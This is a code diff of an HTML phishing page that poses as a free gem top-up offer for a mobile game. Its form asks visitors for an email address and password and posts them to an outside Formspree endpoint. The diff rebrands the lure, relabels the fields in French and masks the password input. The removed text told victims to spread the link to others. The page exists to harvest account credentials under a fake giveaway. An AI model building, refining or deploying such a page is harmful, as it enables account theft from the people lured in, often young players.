@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>شحن جواهر فري فاير</title>
+  <title>شحن جواهر مجانا</title>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet"/>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -105,7 +105,8 @@
       transition: color 0.3s;
     }
 
-    input[type="text"] {
+    input[type="text"],
+    input[type="password"] {
       width: 100%;
       padding: 14px 44px 14px 16px;
       background: rgba(255,255,255,0.05);
@@ -119,13 +120,14 @@
       direction: ltr;
     }
 
-    input[type="text"]:focus {
+    input[type="text"]:focus,
+    input[type="password"]:focus {
       border-color: rgba(0,200,255,0.5);
       background: rgba(0,200,255,0.05);
       box-shadow: 0 0 0 3px rgba(0,200,255,0.08);
     }
 
-    input[type="text"]::placeholder {
+    input::placeholder {
       color: rgba(255,255,255,0.18);
     }
 
@@ -169,33 +171,33 @@
 <body>
   <div class="card">
     <div class="logo">📋</div>
-    <h1>شحن جواهر فري فاير</h1>
+    <h1>شحن جواهر مجانا</h1>
     <p class="subtitle">أدخل البيانات وسيتم الإرسال فوراً</p>
 
     <form id="myForm" action="https://formspree.io/f/xlgvwenj" method="POST">
 
       <div class="field">
-        <label>adresse gmail</label>
+        <label>Adresse</label>
         <div class="input-wrap">
-          <input type="text" name="ID" placeholder="adresse gmail" required/>
-          <span class="input-icon">🪪</span>
+          <input type="text" name="Adresse" placeholder="Entrez votre adresse" required/>
+          <span class="input-icon">📍</span>
         </div>
       </div>
 
       <div class="field">
-        <label>password</label>
+        <label>Mot de passe</label>
         <div class="input-wrap">
-          <input type="text" name="Name" placeholder="password" required/>
-          <span class="input-icon">👤</span>
+          <input type="password" name="Mot de passe" placeholder="Entrez votre mot de passe" required/>
+          <span class="input-icon">🔒</span>
         </div>
       </div>
 
-      <button type="submit">إرسال ✉️</button>
+      <button type="submit">Envoyer ✉️</button>
     </form>
 
     <div class="success-msg" id="successMsg">
       <span>✅</span>
-      تم الإرسال بنجاح!انتضر 3 ساعات فحسب ارسل الينك الى اشخاص آخرين لجني المزيد من الجواهر
+      Envoyé avec succès !
     </div>
   </div>
 
@@ -206,7 +208,7 @@
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       const btn = form.querySelector('button');
-      btn.textContent = 'جاري الإرسال...';
+      btn.textContent = 'Envoi en cours...';
       btn.disabled = true;
 
       try {
@@ -220,11 +222,11 @@
           form.style.display = 'none';
           success.style.display = 'block';
         } else {
-          btn.textContent = 'حدث خطأ، حاول مجدداً';
+          btn.textContent = 'Erreur, réessayez';
           btn.disabled = false;
         }
       } catch {
-        btn.textContent = 'حدث خطأ، حاول مجدداً';
+        btn.textContent = 'Erreur, réessayez';
         btn.disabled = false;
       }
     });
